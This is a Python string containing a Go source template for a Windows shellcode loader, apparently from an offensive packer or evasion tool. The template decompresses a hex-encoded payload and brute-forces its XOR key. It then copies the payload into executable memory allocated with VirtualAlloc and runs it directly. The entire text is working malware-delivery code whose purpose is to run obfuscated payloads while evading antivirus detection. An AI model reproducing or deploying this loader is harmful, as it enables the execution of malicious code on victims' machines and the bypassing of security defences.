loader="""
package main

import (
    "bytes"
    "encoding/binary"
    "encoding/hex"
    "compress/zlib"
    "io"

    "unsafe"
    "syscall"
)

func bf_xor(block []byte, known_bytes []byte) []byte {{
    encrypted := block[0:1000]
    decrypted := make([]byte, len(encrypted))
    key := make([]byte, 4)
    var k uint32 = 0
    for {{
        binary.LittleEndian.PutUint32(key, k)
        for i, ch := range encrypted {{
            decrypted[i] = (ch ^ (key[i % len(key)]))
        }}
        if bytes.Compare(decrypted[128:132], known_bytes) == 0 {{
            if len(decrypted) == len(block) {{
                break
            }} else {{
                encrypted = block
                decrypted = make([]byte, len(block))
            }}
        }} else {{
            k += 1
        }}
    }}
    return decrypted
}}

func main() {{
    compressed, _ := hex.DecodeString("{0}")
    known_bytes, _ := hex.DecodeString("{1}")

    var b1, b2 bytes.Buffer
    b1.Write([]byte(compressed))
    r, _ := zlib.NewReader(&b1)
    io.Copy(&b2, r)
    r.Close()
    encrypted := b2.Bytes()
    payload := bf_xor(encrypted, known_bytes)

    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    ntdll := syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
    _, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
    syscall.Syscall(addr, 0, 0, 0, 0)
}}
"""
